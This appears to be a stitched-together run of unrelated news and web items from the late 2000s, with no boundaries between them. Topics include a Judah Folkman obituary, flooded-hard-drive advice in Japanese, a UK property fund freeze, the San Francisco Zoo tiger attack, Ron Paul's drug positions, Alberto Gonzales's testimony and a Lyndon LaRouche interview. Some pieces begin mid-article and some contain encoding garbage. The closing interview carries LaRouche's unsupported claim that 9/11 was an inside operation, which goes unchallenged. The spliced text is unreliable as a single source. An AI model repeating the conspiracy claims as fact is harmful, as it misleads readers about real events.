That does n't mean he 's given up the dream just yet : he 's hoping to score big with his band , Whale , which he says has " the green light , " but has " decided to take a little time off to record our EP and package ourselves properly . "
Hm , seems like a perfect opportunity to get back together with Dell , actually -- it could use some new music after getting caught using GarageBand 's built - in loops in that XPS One teaser
Judah Folkman , " the father of antiangiogenesis , " a way to starve tumors of their blood supplies , died yesterday from an apparent heart attack .
He was 74 years old .
Folkman , director of the Vascular Biology Program at Children 's Hospital Boston , served as the hospital 's surgeon in chief from 1967 to 1981 .
During his tenure , he published a groundbreaking article in The New England Journal of Medicine , suggesting that tumors require angiogenesis , the formation of new blood vessels ( from established ones ) to provide the nutrients their cells need to grow beyond a certain size .
He had first had this insight in the 1960s when he was serving as a Navy surgeon and was tasked with developing a blood substitute that could be a lifesaver during combat .
( At the time , it was cancer research dogma that tumors did not need new vessels to thrive . )
For much of the next two decades Folkman was treated as a pariah by his peers , who dismissed his theory outright .
He was criticized whenever he announced a finding .
To continue his unpopular research after all other funding sources dried up , he was forced to take a hefty sum — $ 23 million — from chemical company Monsanto .
Convinced he was on the right track , he persevered in the face of adversity .
By the mid-1990s the tide turned in his favor when researchers in his lab discovered that two natural proteins , angiostatin and endostatin , could effectively block angiogenesis .
In 1997 Folkman 's group published a paper in which they described experiments showing that endostatin had dramatically reduced the sizes of aggressive malignant tumors by choking off their blood supplies .
But that was n't all : he also inadvertently discovered that the therapy not only slowed tumor growth but actually stopped it in its tracks by targeting more genetically stable blood - vessel manufacturing endothelial cells rather than the highly mutable tumor cells ; this prevented the tumor from becoming immune to or developing a resistance to the proteins
In 1998 Folkman became a media sensation when Nobel scientist James Watson , co-discoverer of the DNA double helix , declared on the front page of The New York Times that he was " going to cure cancer in two years . "
At the time , Folkman 's antiangiogenic therapies had successfully shrunk enormous mouse tumors comparable two - pound ( 0.9 - kilogram ) masses in humans .
And , almost overnight , angiogenesis inhibitors became the cancer therapy du jour .
" At the beginning I felt enormous pressure , " Folkman said in a 2002 interview with Scientific American .
" [ The news ] raised expectations and demand for angiogenesis inhibitors before these drugs had completed testing in clinical trials .
…
For any new type of therapy there is always a dilemma about when to inform the public .
If it 's too early , then physicians are besieged by calls from patients for drugs that can not be obtained .
If too late , then critics say that hope was destroyed for patients with advanced disease . "
Antiangiogenic drugs have had mixed results in human clinical trials over the past decade , including one in which only four of 42 patients suffering from cancers affecting hormone - producing nerve cells who were given endostatin experienced long - term relief .
Today , however , many successful therapies involve angiogenesis .
In early 2004 the Food and Drug Administration ( FDA ) approved Avastin , a drug manufactured by Genentech , for use , along with chemotherapy , for colorectal cancer ; another antiangiogenic drug , thalidomide , was okayed by the FDA in 2006 for the treatment of multiple myeloma ( cancer of the body 's plasma cells , white blood cells that make antibodies ) ; a few antiangiogenics have also been approved to treat macular degeneration ( a progressive vision - impairing disease that destroys the macular , or central portion , of the retina ) .
" I 'm extremely satisfied , " Folkman told BusinessWeek during a 2005 interview .
" In the past , we always assumed that unless you were making the patient really sick , flooding the body with these really toxic chemotherapies , the treatment was n't working .
…
With these angiogenic drugs , you have none of that .
All my patients comment on how much strength they have ; they 're all back at work . "
Rakesh Jain , a professor of tumor biology at Harvard Medical School — where Folkman held appointments as both a professor of pediatric surgery and cell biology — remembers inviting Folkman to give a lecture to a class he was teaching on tumor pathophysiology at the Massachusetts of Technology in 1983 .
" He is one of the most mesmerizing speakers I have known in my life , " Jain says of the man who would become his colleague and co-lecturer at Harvard nearly a decade later .
" He humanizes science . … that 's a quality I try to emulate . "

めったにあることではないが，洪水や津波，高潮によってHDDが水没してしまったときのアンチ・パターンである。洪水が引いた後であれば，サーバーやパソコンは泥だらけになっているだろう。津波や高潮の後だと，海水に含まれる塩分で汚れているかもしれない。不用意に電源を入れるのもためらわれるはず。
そんなときでも，すぐにあきらめる必要はない。データ復旧会社に依頼すれば，HDDの修理は不可能だとしても，そこに保存されているデータだけは復旧できる可能性がある。ただし，応急処置のやり方を間違えると，データは一気に復旧できなくなる。濡れてしまったディスクを乾かしてはいけないのである。
HDD に保存されているデータは水に濡れただけでは，そう壊れるものではない。データの読み取りを困難にするのは，川や海の水に含まれる泥やミネラルなのだ。これがプラッタ（円盤）にこびりついて，磁気ヘッドでデータを読み取ることができなくなるのである。水分が残っているうちは，純水や薬品などを使って洗浄すれば泥もミネラルも水と一緒に洗い流すことができるが，乾いてこびりついてしまうと，洗浄してもなかなか落ちない。
従って，万一水没させてしまったら，HDDを取り外し，濡れたきれいなタオルでHDDをくるむとよい。その状態のまま，データ復旧会社に持ち込むのだ。ただし，データ復旧会社にもいろいろある。物理的に損傷したHDDからデータを復旧するには，プラッタ表面の研磨，軸受けや磁気ヘッドの交換，磁気ヘッド位置情報の補正など，職人技ともいえる独自の技術が必要になる。すべてのデータ復旧会社がそのような技術を持っているわけではない。洪水で泥だらけになったHDDの復旧を依頼しようとしたら，何社ものデータ復旧会社から「ウチでは無理」と断られ，ようやく見つけた復旧会社でデータの復旧に成功したケースもある。
なお，HDDが水没するのは，水害のときだけではない。火災でスプリンクラーが作動して，ビショビショになることもある。水道水にもミネラル分は含まれているので，そういうときも同じように対処しておくとよい。
One of Britain 's biggest property funds was forced to shut its doors to withdrawals yesterday after the slump in commercial prices triggered panic selling by small investors .
The move prompted fears of a Northern Rock - style run on billions of pounds invested in once high - flying funds which many savers have seen as a safe haven for their pensions .
Scottish Equitable said yesterday that 129,000 small investors in its £ 2bn property fund will not be able to access their money for up to a year , although payments relating to regular income already being paid , retirements and death claims will not be affected .
It said the fund , invested in London office blocks and shopping centres across Britain , no longer had sufficient cash reserves to meet demands from investors wanting to withdraw their money .
Its " buffer fund " was down to 1 % of its total assets , instead of the usual 10 - 15 % .
Commercial property values , especially in the City of London office market , have dived amid fears of a recession brought on by the global credit crunch .
In late December another insurer , Friends Provident , halted access to its £ 1.2 bn property fund and last night speculation was growing that Scottish Widows may be on the verge of restricting customer withdrawals on some of its funds .
The insurer said last night : " We are looking at all the options , but no decisions have been taken . "
Scottish Equitable 's parent group , Aegon UK , is due to announce the closure of its fund today .
It said last night : " Aegon UK has decided to take this step to protect investors following a significant level of customer withdrawals from the UK property fund market . "
It blamed " worldwide phenomena relating to concerns over the US sub - prime mortgage market fallout , rising interest rates and talk of recession " .
The Financial Services Authority said it was closely monitoring the situation and had been informed by Aegon of the decision to halt withdrawals .
The crisis in Britain 's commercial property market is now worse than at any time since the early 1990s , when Olympia & York , the company that began the Canary Wharf office development in London , went into administration .
The credit crunch has raised borrowing costs , making many property deals no longer attractive .
Financial institutions hit by the fallout are already beginning to cut staff , reducing demand in the City office market in which most of the UK 's property funds are invested .
A downturn in consumer spending growth is also making retail shopping developments less attractive to investors .
Small investors have put about £ 15 bn into property unit trusts - £ 5 bn pouring in during 2006 and early 2007 alone .
Billions more are invested through pension funds held by millions of company employees .
Investors bought into promises of rich returns after a decade in which returns far outstripped gains on shares or bonds .
But the downturn in values since the middle of 2007 has been savage .
Shares in British Land , the UK's leading property company , have fallen by nearly half , and most funds are showing falls of between 20 % and 40 % .
But investors stampeding for the exit are now finding that they cannot access their cash .
The crux of the problem is that the funds are invested in buildings which can take months to sell , and therefore cannot produce the cash to pay out money to small investors if they all want it back at the same time .
Usually the funds hold a cash " buffer " of 10 - 15 % of total assets to meet withdrawals .
But Scottish Equitable said yesterday that the cash buffer in the £ 2bn fund had fallen to just £ 80 m following a wave of redemptions , giving it little choice but to suspend the fund .
The only alternative was a " fire sale " of its holdings which could leave investors even worse off .
It emerged yesterday that staff at some of the property managers have been informing key clients in advance that a fund is heading for suspension .
The FSA said that such trading may fall foul of its rules regarding treating customers fairly .
Financial advisers continue to recommend that investors take their cash out of the funds that remain open .
Jason Hemmings of Albannach Financial Management in Edinburgh said : " There are lots of rumours going about that other providers may be considering following Friends Provident and Aegon . "
The Aegon / Scottish Equitable property funds are managed by Morley Fund Management , which also runs the £ 4bn Norwich Union Property unit trust , the UK 's biggest property fund .
This week Norwich Union said the fund had fallen in value by a fifth over the year , but its cash buffer was at 6.4 % after selling office blocks in London and Manchester worth £ 165 m .
Aegon UK added that it believes the " underlying fundamentals of the asset class remain healthy " .
In ambulance , survivors of S.F. tiger attack made pact of silence S.F. ZOO TIGER ATTACK

In ambulance , survivors of S.F. tiger attack made pact of silence 1 / 3 Back to Gallery
Soon after their 17 - year - old friend was mauled to death by a tiger at the San Francisco Zoo , the two brothers who survived the attack made a quick pact not to cooperate with the police as they rode in an ambulance to the hospital , sources told The Chronicle .
" Do n't tell them what we did , " paramedics heard 23 - year - old Kulbir Dhaliwal tell his brother , Paul , 19 .
Sources also say that the younger brother was intoxicated at the time of the incident , having used marijuana and consumed enough liquor to have a blood - alcohol level above the .08 limit for adult drivers .
The older brother also had been drinking and using marijuana around the time a 350 - pound Siberian tiger escaped and killed Carlos Sousa Jr. , the sources said .
The brothers ' initial refusal to cooperate has frustrated authorities in the days after the Christmas Day attack as investigators attempt to find out what might have precipitated it .
On Friday , the San Francisco city attorney fired off a letter to the brothers ' attorney , saying that the San Jose men have refused to let police see any photos or calls they might have made using their cell phones .
Although the police still possess the cell phones and have impounded the brothers ' car , city attorney spokesman Matt Dorsey said that without the Dhaliwals ' permission , police cannot legally search the items as potential evidence .
Among the items police say they have spotted in the car is an empty vodka bottle .
In the letter to the brothers ' attorney , Mark Geragos , City Attorney Dennis Herrera asked that any evidence , including the records of calls and cell phone photos , be preserved .
Herrera suggested that experts working for the brothers be allowed to inspect the cell phones and car at the same time as investigators from his office .
Geragos could not be reached for comment late Friday , although he has repeatedly denied that the brothers taunted the tigers .
A witness told The Chronicle this week that she spotted the young men teasing the lions in the big - cat grotto shortly before the attack .
Geragos has also previously said that he would await the outcome of tests to comment on any alcohol use .
The Dhaliwals have given an account of what occurred that evening through their attorney , saying they tried frantically for more than 30 minutes to get help from reluctant zoo officials .
One cafe worker would not open the door for them , and a zoo staffer driving a golf cart was " diffident , " Geragos said .
Police have said that since the attack , the brothers have given authorities partial accounts of what occurred .
Meanwhile , zoo officials said late Friday they 've discovered that other exhibits do n't meet national safety standards .
Zoo officials conceded last week that a moat wall at the tiger enclosure is only 12 1 / 2 feet high - 4 feet shorter than recommended .
Work is being done to raise the wall .
The wall at the polar bear exhibit also is too short , the zoo said in a statement released late Friday .
Work is under way to install a chain - link fence that will raise the wall of the enclosure to 16 feet - a height that satisfies guidelines of the Association of Zoos and Aquariums .
Also Friday , zoo Director Manuel Mollinedo said his staff is working with police to create a coordinated emergency response for any future animal incidents .
Fire and police dispatch logs from Christmas night show that emergency crews were forced to wait outside the zoo after Sousa was mauled because zoo security guards were enforcing an emergency lockdown .
Authorities were also hampered by a lack of emergency lighting and an absence of maps of the grounds .
Since then , the zoo has provided police at Taraval Station with maps and keys to the facility , Mollinedo said .
He said he also has talked to Police Chief Heather Fong about zoo employees and officers doing gun training together .
" We have to at least work with them if they are going to assist us in the future , if something tragic like this occurs again .
We have to train them where to shoot specific animals and know what types of weapons to use in case that does happen , " Mollinedo said .
Police also have been invited to visit the zoo during the day so officers can familiarize themselves with the trails there , Mollinedo said .
The zoo reopened Thursday after being closed for nine days .
It was closed again Friday because of storm damage but is expected to open Saturday .

BRUSSELS ( Reuters ) - Police patrolling the red - light district of the Belgian capital have been ordered to stop visiting brothels and drinking in bars when on duty .
A letter sent to officers in Brussels ’ northern police district , and published in a Belgian daily Tuesday , urged them to set a good example and earn the public ’s respect .
“ These officers think their duty hours are to be used to drink alcohol in bars , practice sports ... , visit brothels or massage parlors , and entertain ( intimate ) relationships with residents of the neighborhood during their patrol , ” said the letter from a local police chief .
“ It is only by setting a good example that the police can make itself respected , ” the letter said , urging officers to adopt more conservative behavior .
A police spokesman confirmed the letter was authentic , but said the police chief had only reacted to rumors of officers behaving badly while on duty .
“ There was no concrete evidence to substantiate any wrongdoing by police officers ...
If there had been , they would have been prosecuted , ” said spokesman Roland Thiebauld .
W3C Relaunches HTML Activity
Developers and Browser Vendors Shape HTML Future

http://www.w3.org/ -- 7 March 2007 --
Recognizing the importance of an open forum for the development of the predominant Web content technology , W3C today invites browser vendors , application developers , and content designers to help design the next version of HTML by participating in the new W3C HTML Working Group .
Based on significant input from the design and developer communities within and outside the W3C Membership , W3C has chartered the group to conduct its work in public and to solicit broad participation from W3C Members and non-Members alike .
" HTML started simply , with structured markup , no licensing requirements , and the ability to link to anything .
More than anything , this simplicity and openness has led to its tremendous and continued success , " explained Tim Berners - Lee , W3C director and inventor of HTML .
" It 's time to revisit the standard and see what we can do to meet the current community needs , and to do so effectively with commitments from browser manufacturers in a visible and open way . "
The Evolution of HTML
After the publication of HTML 4 , and following a 1998 Workshop , W3C set forth to turn HTML into an XML - based format , called XHTML , due to the benefits of XML formats .
The first full XHTML Recommendation was issued in early 2000 .
But due to the significant legacy of Web content that is some variant of HTML , traditional browser vendors moved slowly to adopt XHTML .
This , in turn , has meant little motivation for content developers to adopt XHTML for the traditional desktop environment .
Leaders in the Web developer and design communities therefore urged W3C to renew its commitment to HTML by adding new features ( starting with the HTML 4 standard ) in a manner that is consistent with community practice and backward compatible .
W3C will help ensure interoperability by making robust test suites and validation services available to the community for future technologies .
W3C is pleased to relaunch work on HTML with strong support from its Members and more staff resources ( including people and hardware ) .
W3C has tailored the HTML Working Group Charter to enable active participation from browser vendors , applications designers , and content developers , whose joint participation is key to the success of the future HTML .
The Value of XHTML
XHTML has proved valuable in other markets , including the market for mobile devices , in enterprise applications , on the server - side , and in an increasing number of Web applications such as blogging software .
For example , the Mobile Web Best Practices Working Group has included XHTML Basic as a cornerstone of the Mobile Web Best Practices because software running in less memory can support it .
The markets for XML content are significant and growing , so W3C will define an XML syntax for the new HTML in addition to the classic HTML syntax .
One of the design aims for XHTML 2.0 has been to keep it as generic as possible , reusing applicable XML standards , including XForms , XML Base , and XML Events , instead of HTML features that served similar purposes .
Those design choices have led to XHTML 2.0 having an identity distinct from HTML .
With the chartering of the XHTML 2 Working Group , W3C will continue its technical work on the language at the same time it considers rebranding the technology to clarify its independence and value in the marketplace .
In addition to the new HTML and XHTML 2 Working Groups , W3C is also pleased to recharter the Hypertext Coordination Group and charter the Forms Working Group .
The Forms Working Group will continue work on the XForms architecture , which has seen significant adoption in a variety of platforms .

Ron Paul on Drugs Republican Representative ( TX - 14 ) ; previously Libertarian for President
War on drugs is out of control ; revert control to states
A : Yeah .
It ’s sor of like alcohol .
Alcohol ’s a deadly drug , kills more people than anything else .
And today the absurdity on this war on drugs has just been horrible .
Now the federal government takes over and overrules states where state laws permit medicinal marijuana 1 for people dying of cancer .
The federal government goes in and arrests these people , put them in prison with mandatory sentences .
This war on drugs is totally out of control .
If you want to regulate cigarettes and alcohol and drugs , it should be at the state level .
That ’s where I stand on it .
The federal government has no prerogatives on this .
Q : But you would decriminalize it ?
A : I would , at the federal level .
I do n’t have control over the states .
And that ’s why the Constitution ’s there .
Repeal most federal drug laws ; blacks are treated unfairly
A : I would like to believe that if we had a freer society , it would take care of Blacks and whites and everybody equally because we ’re all individuals .
To me , that is so important .
But if we had equal justice under the law , I think it would be a big improvement .
If we had probably a repeal of most of the federal laws on drugs and the unfairness on how Blacks are treated with these drugs laws , it would be a tremendous improvement .
And also , I think that if you ’re going to have prosperity , it serves everybody .
And if this is done by emphasizing property rights and freedom of the individuals , making sure that the powerful special interests do n’t control Washington , that the military industrial complex does n’t suck away all the wealth of the country , and then we would have prosperity .

Inner-city minorities are punished unfairly in war on drugs
A : A system designed to protect individual liberty will have no punishments for any group and no privileges .
Today , I think inner-city folks and minorities are punished unfairly in the war on drugs .
For instance , Blacks make up 14 % of those who use drugs , yet 36 percent of those arrested are Blacks and it ends up that 63 % of those who finally end up in prison are Blacks .
This has to change .
We do n’t have to have more courts and more prisons .
We need to repeal the whole war on drugs .
It is n’t working .
We have already spent over $ 400 billion since the early 1970s , and it is wasted money .
Prohibition did n’t work .
Prohibition on drugs does n’t work .
So we need to come to our senses .
And , absolutely , it ’s a disease .
We do n’t treat alcoholics like this .
This is a disease , and we should orient ourselves to this .
That is one way you could have equal justice under the law .

$ 500B on War on Drugs since 1970s has been a total failure
What it does , it removes the ability to states to do their things , and also introduces the idea that it ’s the federal government that will get to decide whether we get to take vitamins , and alternative medical care , or whatever .
Most of our history , believe it or not , had no drug laws .
Prohibition has been an absolute failure for alcohol .
Drug addiction is a medical problem .
It ’s not a problem of the law .

Drug
War fosters violence at home & breeds resentment abroad
The drug war encourages violence .
Government violence against nonviolent users is notorious and has led to the unnecessary prison overpopulation .
Innocent taxpayers are forced to pay for all this so - called justice .
Our drug eradication project ( using spraying ) around the world , from Colombia to Afghanistan , breeds resentment because normal crops and good land can be severely damaged .
Local populations perceive that the efforts and the profiteering remain somehow beneficial to our own agenda in these various countries .
Societal inconsistency on alcohol contributes to drug use
The drug craze reflects the desperate feeling of many .
Young people remains skeptical of a generation that kills ten times as many with alcohol as with hard drugs and yet pontificates about the dangers of smoking marijuana .
Lack of consistency never contributes to credibility .
Voted NO on more funding for Mexico to fight drugs .
Provide assistance for Mexico for : counternarcotics and countertrafficking ; port & airport security to assist in controlling the Mexico - US and Mexico - Central America borders ; intelligence gathering operational technology ; and public security and law enforcement , including assistance to the National Council Against Addiction ( CONADIC ) .
Proponent 's argument to vote Yes : Rep. HOWARD BERMAN ( D , CA - 28 ) :
The drug crisis facing the US remains a top national security threat .
This bill represents a new partnership with Mexico and Central American countries to face the immediate security threat of drug gangs , and help these neighbors build the capacity of their law enforcement agencies .
Opponent 's argument to vote No : Rep. MICHAEL McCAUL ( R , TX - 10 ) :
We need a strategy on this side of the border : a two - pronged Approach ; a comprehensive strategy that deals not only with the Mexican side but with the US side .
And for too long , our border sheriffs and our Border Patrol agents have been outmanned and outgunned .
And if we are going to provide assistance to Mexico , it seems to me we ought to be providing assistance to our men and women on our side fighting this war every day .
Rep. TED POE ( R , TX - 2 ) : I am concerned about drugs and violence on the border , but I am also concerned about corruption .
In order to gain control of access corridors in the US , drug cartels are hiring hit men from an elite force in Mexico 's military .
This group is known as the " Zetas . "
Some of the Zetas are military deserters that may have been trained in the US .
$ 1 billion in this bill would go to Mexico .
And Mexico in its arrogance objects to any conditions we want to put on this money .
The administration can offer us no assurance that our equipment and training wo n't be used against us and neither can Mexico .

Per the tenth amendment to the US Constitution , matters such as drugs should be handled at the state or personal level .
All laws which give license to violate the Bill of Rights should be repealed .

Rated A by VOTE - HEMP , indicating a pro-hemp voting record .
VOTE HEMP is a non-profit organization dedicated to the acceptance of and free market for Industrial Hemp .
Industrial Hemp is non-psychoactive low THC varieties of the cannabis sativa plant .
Currently , it is illegal for U.S. farmers to grow Industrial Hemp because it is improperly classified as a " drug " under the Controlled Substances Act .

Rated +30 by NORML , indicating a pro-drug - reform stance .
OnTheIssues.org interprets the 2006 NORML scores as follows :
- 30 to - 10 : " hard - on - drugs " stance ( approx . 228 members )
- 9 to +9 : mixed record on drug reform ( approx. 37 members )
+10 to +30 : pro-drug - reform stance ( approx . 109 members )
National Organization for the Reform of Marijuana Law 's mission is to move public opinion sufficiently to achieve the repeal of marijuana prohibition so that the responsible use of cannabis by adults is no longer subject to penalty .
NORML is a nonprofit , public - interest lobby that for more than 30 years has provided a voice for those Americans who oppose marijuana prohibition .
We represent the interests of the tens of millions of Americans who smoke marijuana responsibly and believe the recreational and medicinal use of marijuana should no longer be a crime .
NORML supports the removal of all criminal penalties for the private possession & responsible use of marijuana by adults , including the cultivation for personal use , and the casual nonprofit transfers of small amounts .
This model is called " decriminalization . "
NORML additionally supports the development of a legally controlled market for marijuana , where consumers could purchase it from a safe , legal and regulated source .
This model is referred to as " legalization . "
NORML believes that marijuana smoking is not for kids and should only be used responsibly by adults .
As with alcohol consumption , it must never be an excuse for misconduct or other bad behavior .
Driving or operating heavy equipment while impaired from marijuana should be prohibited .
NORML strongly supports the right of patients to use marijuana as a medicine when their physician recommends it to relieve pain and suffering .
Lastly , NORML supports the right of farmers to commercially cultivate hemp for industrial purposes , such as food and fiber production .

Distribute sterile syringes to reduce AIDS and hepatitis .
To permit the use of Federal funds for syringe exchange programs for purposes of reducing the transmission of bloodborne pathogens , including HIV and viral hepatitis .
Congress finds as follows : Each year , approximately 12,000 Americans contract HIV / AIDS and approximately 19,000 Americans contract the hepatitis C virus directly or indirectly from sharing contaminated syringes .
A 2005 comprehensive international review of the evidence of the effectiveness of syringe exchange programs in preventing HIV transmission shows that such programs reduce HIV transmission and are cost - effective .
Research has shown that injection drug users who are referred to addiction treatment from syringe exchange programs are more likely to enter and remain in treatment .
Research has shown that , by providing safe disposal of used injection equipment , syringe exchange programs significantly reduce the number of improperly discarded syringes in the community , thereby reducing the exposure of police and others to dangers of blood - borne disease from accidental syringe sticks .
Syringe exchange programs reduce the prevalence of HIV among injection drug users .
Despite the scientific and public health consensus that syringe exchange programs reduce HIV and do not increase substance abuse , a ban on funding syringe exchange has been enacted as part of each Appropriations
Act since 1998 .
The Public Health Service Act , as added by the Ryan White Comprehensive AIDS Resources Emergency
Act of 1990 , is subject to a statutory ban on funding needle exchange programs .

Cartoonist and all - around seeker of unusual truths , Jay Kinney , says :
Attached is a page from T - Man comics # 3 from 1952 .
I just happened upon it by chance and – Holy Smokes !
– all was revealed .
We can now grasp the origins of the Bush administration 's foreign policy !
It was all there in T - Man # 3 , 55 years ago !
Perhaps
Cheney read this comic in his youth and just bided his time until he was in a position to actualize it in real life .
Reader comment :
The Watchful Babbler says :
Incidentally , the plot of the comic , according to Wright 's Comic Book Nation , is that the incident " was the work of a Soviet agent disguised as Trask , who is trying to poison relations between Iran and the West " — and , judging from the comic , between America and " old Europe " as well .
Perhaps the real Dick Cheney will appear before the 2008 elections and defeat the al - Qa'ida mole who has been impersonating him for the past several years .
( N.B. : Wright inaccurately says that the 1951 comic was " obviously inspired by the recent overthrow of the anti-Western Mossadegh government in Iran , " which is patently impossible : Musaddiq was appointed PM in mid-1951 to assuage public anti-colonial sentiment ; TPAJAX did n't take place until two years after this comic was published .
Instead , this story may reflect post- nationalization hopes that Western policies would , by their innate goodness , eventually win over nonaligned states under Soviet threat .
Actually , does n't that sound like modern neoconservative theory , too ? )
Mcjoan and litigatormom have already started rounding up the coverage of Alberto Gonzales ' Senate testimony .
As mcjoan observed , the New York Times editorial reads like a blog post - and they 're not the only ones .
Many in the traditional media appear to have been bitten by the snark bug .
Byron York :
Judging by his testimony before the Senate Judiciary Committee Thursday , there are three questions about the U.S. Attorneys mess that Attorney General Alberto Gonzales wants answered :
What did I know ?
When did I know it ?
And why did I fire those U.S. Attorneys ?
Chicago Tribune :
Atty .
Gen. Alberto Gonzales faced two unappealing possibilities in his testimony to Congress on Thursday .
He could admit that he was largely out of the loop on some of the most important decisions that the Justice Department can make :
Who should serve as U.S. attorney ?
Or he could acknowledge he was at the center of the hugely bungled dismissals of several federal prosecutors .
In other words : Was he clueless ?
Or incompetent ?
Unfortunately for Gonzales , his hours of testimony before the Senate Judiciary Committee created the impression that he was some of both .
Dallas Morning News :
In his Senate testimony yesterday , Attorney General Alberto Gonzales said , " The moment I believe I can no longer be effective , I will resign as attorney general . "
With respect , we suggest that Mr. Gonzales watch the tape of his disastrous showing in Thursday 's hearing .
Seeing is believing .
CBS News.com :
Me ?
I ’m more in the camp of the unnamed " White House officials " who reportedly said that the Attorney General was " going down in flames . "
I thought that Gonzales ’ performance was among the worst I have ever seen offered by a public official on Capitol Hill .
The Attorney General , our nation ’s top law enforcement official , was evasive , incomplete and at times even incoherent with his explanations about what he knew , and when he knew it , when it came to the decisions that were made about the prosecutors by the Justice Department and White House .
He kept saying " I do n’t know " or " I do n’t recall " and he was particularly infuriating to the senators when he used as a crutch the notion that current investigations into the scandal have precluded him doing more to offer them relevant answers to their earnest questions .
....
Whether he is a liar , as some say , or a fool , as others contend , the consequence ought to be the same .
And if you did n’t believe it before surely you should consider it now in the wake of his appalling testimony before the Committee : Gonzales simply is n’t good enough to merit the job he now has .
The President may be " pleased " by a performance he never saw but I suspect that many other Americans would beg to differ .
Also see Time magazine , Eve Fairbanks for The New Republic , the Seattle Times and Fort Worth Star - Telegram both here , and the San Diego Union - Tribune .
This guy has no support left .
NEW HAMPTON , Iowa , Oct. 5 — A broad grin spread across Senator Barack Obama ’s face as he turned to walk away from a city park here on Friday after shaking the last hand and posing for a final photograph with a clutch of supporters .
Given the political news of the week , at least back in Washington , why the smile ?
“ It ’s not over , ” Mr. Obama said , pausing for a moment to answer an open - ended question about the state of the campaign .
“ Presumably if they thought the race was over , they would n’t be taking the time to come to a town hall meeting to talk about the presidential race . ”
If the chase for the Democratic nomination appears to have reached a stage of inevitability , if Senator Hillary Rodham Clinton of New York is becoming a runaway front - runner as national polls might suggest and some of her rivals are beginning to fear , the word has not reached the voters here in Chickasaw County .
It is not that the 200 or so people who turned out to see Mr. Obama on Friday morning are oblivious to such prognostications .
As ardent political enthusiasts , many of them obsessively follow them .
But the voters here have not necessarily become believers , particularly before they have a chance to size up the competition when it comes to town .

This is the season of giving , as they say .
There are a lot of religions who use this time of year for reflection , charity and general goodwill .
I dont see why atheists can't also use this time of year to be benevolent .
Any time of year is good of course , but personally I find winter solstice to be one of the most uplifting days of the year , so why not ?
I 've been asked often why there are n't any atheist charities .
Of course , as usual , people are just presuming or parroting things they heard .
Of course there are atheist charities .
And like in my videos post , I am considering charities that do not promote a specific religion to be an atheist charity .
I found most of these at the Internet Infidels discussion board ( and copied descriptive text from there , apologies if that was a problem ) .
But I thought a nice list would be better , plus I added a few more .
There are useful sites like CharityNavigator to help you sort through all the charities out there .
If there are comments proposing ones that I missed ( and surely there are plenty ) , I will add them to this list , if they are highly rated ( not that all of these are ) .
So here goes :
UPDATE 2009 : I apologize for not refreshing this list .
No time this year .
Please feel free to leave some more a - theist charities for me to include in future versions in the comments .

File photo shows Lyndon H. LaRouche , Jr. is making a speech in October , 2005 , in Washington , US .
Lyndon H. LaRouche , Jr. is an American political activist and founder of various political organizations in the United States and elsewhere .
He is perhaps best known for being a ï¿½ï¿ ½perennial candidateï¿½ï¿½ for U.S. Presidency , having set a minor record for most consecutive attempts at the office by running eight times ; Harold Stassen ran for President nine times , but not consecutively .
LaRouche has run for the Democratic nomination for President in every election year since 1980 , including in 1992 while he was in prison .
Yet he and his " LaRouche movement " have gained only limited electoral support , although he has received some support in Democratic presidential primaries .
Although he has no formal qualifications , LaRouche has written extensively on economic , scientific , political , and cultural topics .
Critics consider him to be a conspiracy theorist and political attention - seeker .
He is frequently described as an extremist , cult leader , a communist , a fascist , and an anti-Semite , all of which he denies .
LaRouche is regarded by his followers as a brilliant individual who for political reasons has been unfairly persecuted .
In 1988 LaRouche was sentenced to fifteen years imprisonment for conspiracy , mail fraud , and tax code violations .
He continued his political activities from behind bars .
He was released in 1994 on parole after having served five years .
LaRouche lists his formal position as a director and contributing editor of the Executive Intelligence Review News Service , a core part of the LaRouche movement .
Recently Yong Tang , People 's Daily Online Washington - based staff writer , has conducted an exclusive interview with LaRouche at his home in Virginia .
Yong Tang : Maybe you could be bribed ?
LaRouche : No I can't be bribed .
Yong Tang :
What if they would come here and say we would give you a very important position in the government ?
LaRouche :
They would n't even try .
Yong Tang :
They might say you could work with them with a very high salary ?
LaRouche :
They test you out at times .
If you get that kind of offer and you turn it down , they will probably kill you .
They 'll try to destroy you , even kill you .
If they make an offer and you turn that down , they 're going to punish you .
They do that .
Yong Tang : Right after the 911 terrorist attacks occurred , you claimed during an interview that the tragic event was not done by Osama Bin Laden but by some secret elements inside the American establishment .
Do you still believe in that today ?
LaRouche :
The same thing .
Osama bin Laden is an asset of a certain U.S. interest .
That 's just what he is ...
He is a member of the Bin Laden family , which is a Saudi family , which is the closest family to the George Bush family , to this whole crowd .
Now Osama Bin Laden was a drunk , a carouser , a womanizer .
Like many Saudis are .
They 're devout Islam , but they drink and they sodomize and they do everything like that .
So he became a part of the Anglo - American operations which had been set up by Brzezinski in Afghanistan .
It was called the ``soft underbelly of the Soviet Union . ''
Now that organization still exists and it's still running the operation against the former Soviet Union inside Central Asia and the Caucasia today .
The Orange Revolution is a part of the same thing .
The same operations .
A live operation .
Even the Xinjiang operation against China was done by the same people .
Osama Bin Laden is part of it .
He is still part of it .
Now what they did is at a certain point they cut him loose .
That is , they broke the open tie to him .
Now the operation that was done on 911 was done as an operation from the inside of the United States .
In order to run an operation like that , you decorate it with certain foreign elements .
So now you take a few dead bodies , you scatter them around as evidence .
You know , the scene of the crime , you have some dead bodies there .
You say ``Ah , they did it .
This guy did it !''
You have the dead bodies that are left behind .
Or some people actually participated .
But who set the operation up ?
The operation was one I warned against in January 2001 .
And I said that this government is incompetent , and we have to expect that very soon we will experience something like Herman Goering did in the Reichstag fire in 1933 .
And that 's exactly what happened .
And the operation was set up as an inside operation by inside intelligence capabilities using assets from various parts of the world .
Osama Bin Laden was an integral part , and is an integral part of this capability they used .
So , therefore , what they do is they turn the thing around .
``Osama Bin Laden did it !''
In fact , Osama Bin Laden could n't have done it .
It 's beyond his capabilities .
Could people tied to Osama Bin Laden turn up as dead bodies in this thing ?
Of course !
What do you expect ?
That 's the way it 's done .
When the police want to commit a crime , they will take a certain criminal .
They 'll commit the crime and they 'll shoot the criminal at the scene of the crime .
That proves that he did it .
And people believe it .
Yong Tang :
How do you think of the possibility of another September 11 ?
LaRouche :
They would love to do it .
You have to realize that you 're in a period where we are on the edge of fascist dictatorships .
When you have a general financial crisis , when the system does n't work any more , when the political system does n't work , in that case , certain governments will do what happened in Germany .
They will create incidents in order to create dictatorship .
Now the way you do that is you create something frightening .
You terrify the people .
Then the people who are being terrified are willing to submit to strong measures of government .
What they have is the Patriot Act now .
They did it .
Bush was a failure , a total failure .
But people still say , ï¿½ï ¿
½But he 's the PRESIDENT .
Oh , but he 's the PRESIDENT !
